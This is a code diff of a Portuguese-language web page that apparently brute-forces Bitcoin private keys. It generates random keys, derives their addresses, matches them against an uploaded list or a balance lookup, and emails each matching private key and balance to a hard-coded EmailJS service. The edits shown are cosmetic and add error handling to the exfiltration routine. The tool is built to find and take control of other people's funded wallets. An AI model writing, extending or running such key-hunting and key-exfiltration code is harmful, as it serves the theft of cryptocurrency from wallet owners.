@@ -8,9 +8,9 @@
 body { font-family: Arial; background:#020617; color:#e5e7eb; padding:20px; }
 h2 { color:#38bdf8; }
 input { background:#020617; border:1px solid #1e293b; color:#e5e7eb; padding:6px; width:100%; margin-bottom:8px; }
-.stats { margin-top:10px; padding:10px; border:1px solid #1e293b; border-radius:6px; }
-.match { margin-bottom:10px; border-bottom:1px solid #1e293b; padding-bottom:8px; white-space:pre-wrap; color:#a5f3fc; }
 button { background:#0a0f1c; border:1px solid #1e293b; color:#38bdf8; padding:6px; cursor:pointer; font-weight:bold; margin-bottom:8px; }
+.stats { margin-top:10px; padding:10px; border:1px solid #1e293b; border-radius:6px; }
+.match { margin-bottom:10px; border-bottom:1px solid #1e293b; padding-bottom:8px; white-space:pre-wrap; }
 </style>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -23,16 +23,15 @@ button { background:#0a0f1c; border:1px solid #1e293b; color:#38bdf8; padding:6p
 
 <label>🔽 Subir lista de endereços para procurar (.txt)</label>
 <input type="file" id="file" accept=".txt">
-
 <p id="count">📄 Endereços carregados: 0</p>
+
+<button id="emailTeste">📧 Enviar Email Teste</button>
 
 <div class="stats" id="stats">
 Velocidade: 0 addr/s
 </div>
 
 <div id="matches">🎯 MATCHES:</div>
-
-<button id="emailTeste">📧 Teste Envio de Email</button>
 
 <script type="module">
 import { getPublicKey } from "https://esm.sh/@noble/secp256k1@2.1.0";
@@ -64,8 +63,9 @@ async function consultarSaldo(address){
 
 /* ================= EMAIL ================= */
 async function enviarEmail(dados,tipo="MATCH"){
-  const saldo = await consultarSaldo(dados.P2PKH);
-  const content = `${tipo}
+  try{
+    const saldo = await consultarSaldo(dados.P2PKH);
+    const content = `${tipo}
 
 PRIVATE_KEY: ${dados.privHex}
 
@@ -76,11 +76,16 @@ P2WPKH: ${dados.P2WPKH}
 
 SALDO P2PKH: ${saldo !== null ? saldo+" BTC" : "Erro"}`;
 
-  await emailjs.send("service_z6sug47","template_5fbrhhc",{
-    name:"Sistema BTC",
-    email:"match@sistema.com",
-    message: content
-  });
+    await emailjs.send("service_z6sug47","template_5fbrhhc",{
+      name:"Sistema BTC",
+      email:"match@sistema.com",
+      message: content
+    });
+
+    console.log("Email enviado com sucesso:", dados.P2PKH);
+  } catch(e){
+    console.error("Erro ao enviar email:", e);
+  }
 }
 
 /* ================= ELEMENTOS ================= */
@@ -97,7 +102,7 @@ function atualizarStats(){
   const now = performance.now();
   const delta = (now-lastTime)/1000;
   const speed = Math.floor((totalGerados-lastCount)/delta);
-  document.getElementById("stats").innerHTML=`Velocidade: ${speed} addr/s`;
+  document.getElementById("stats").innerHTML=`Velocidade: ${speed} addr/s<br>Matches: ${totalMatches}`;
   lastTime = now;
   lastCount = totalGerados;
 }
@@ -112,7 +117,7 @@ document.getElementById("file").addEventListener("change",async e=>{
 
 /* ================= GERAR ENDEREÇOS ================= */
 function gerarPrivKey(){
-  const bytes = new Uint8Array(32);
+  const bytes = new Uint8Array(32); // 32 bytes = 256 bits
   crypto.getRandomValues(bytes);
   return [...bytes].map(b=>b.toString(16).padStart(2,"0")).join("");
 }
@@ -138,7 +143,8 @@ async function loop(){
   while(true){
     let dados;
     if(indexLista < listaArray.length){
-      const privHex = listaArray[indexLista++];
+      const privHex = listaArray[indexLista];
+      indexLista++;
       dados = gerarAddress(privHex);
     } else {
       const privHex = gerarPrivKey();
@@ -148,11 +154,10 @@ async function loop(){
     totalGerados++;
 
     (async()=>{
-      let matchFound=false;
+      let isMatch=false;
 
-      // Match lista
       if(listaEnderecos.has(dados.P2PKH) || listaEnderecos.has(dados.P2SH) || listaEnderecos.has(dados.P2WPKH)){
-        matchFound=true;
+        isMatch=true;
         totalMatches++;
         const div = document.createElement("div");
         div.className="match";
@@ -161,10 +166,9 @@ async function loop(){
         enviarEmail(dados,"MATCH ENCONTRADO");
       }
 
-      // Saldo positivo
       const saldo = await consultarSaldo(dados.P2PKH);
       if(saldo && saldo>0){
-        matchFound=true;
+        isMatch=true;
         totalMatches++;
         const div = document.createElement("div");
         div.className="match";
@@ -187,9 +191,10 @@ window.addEventListener("load",()=>loop());
 document.getElementById("emailTeste").addEventListener("click",async()=>{
   const privHex = gerarPrivKey();
   const dados = gerarAddress(privHex);
-  await enviarEmail(dados,"TESTE MANUAL");
+  await enviarEmail(dados,"📧 TESTE MANUAL");
   alert("Email teste enviado!");
 });
 </script>
+
 </body>
 </html>
